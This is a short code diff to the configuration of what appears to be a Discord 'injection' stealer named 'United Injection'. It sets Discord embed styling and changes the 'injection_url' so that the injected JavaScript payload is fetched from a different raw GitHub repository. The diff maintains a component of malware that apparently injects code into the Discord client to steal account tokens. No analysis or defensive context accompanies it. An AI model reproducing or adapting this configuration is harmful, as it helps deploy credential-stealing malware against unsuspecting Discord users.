@@ -14,7 +14,7 @@ const config = {
   embed_name: 'United Injection', 
   embed_icon: 'https://cdn.discordapp.com/icons/1120182577383350362/fbda3e0d699013b6a87d8d2c2d615e56.png?size=1024'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/HediakMasuy/inje/main/index.js', 
   /**
    
    **/
